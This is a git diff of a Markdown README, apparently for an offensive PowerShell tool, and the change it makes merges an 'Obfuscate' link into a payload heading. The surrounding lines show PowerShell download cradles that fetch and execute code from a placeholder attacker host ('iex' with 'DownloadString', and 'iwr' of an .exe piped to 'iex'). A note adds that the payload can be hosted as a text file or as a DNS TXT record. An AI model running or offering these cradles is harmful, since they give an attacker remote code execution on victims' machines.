@@ -187,9 +187,7 @@ ps> powershell iex(new-object System.Net.WebClient).DownloadString("http://ATTAC
 ps> powershell iwr  http://ATTACKERIP:TCPORT/bOlO.exe | iex
 ```
 
-*[2] Obfuscate Basic payload: Change IPADDRESS and TCPPORT*
-
-[Obfuscate](./tools/triggers/oneline.txt)
+*[2] [Obfuscate](./tools/triggers/oneline.txt) Basic payload: Change IPADDRESS and TCPPORT*
 
 **Note:**
 It can be hosted as txt on a web server or as TXT record in a DNS server.
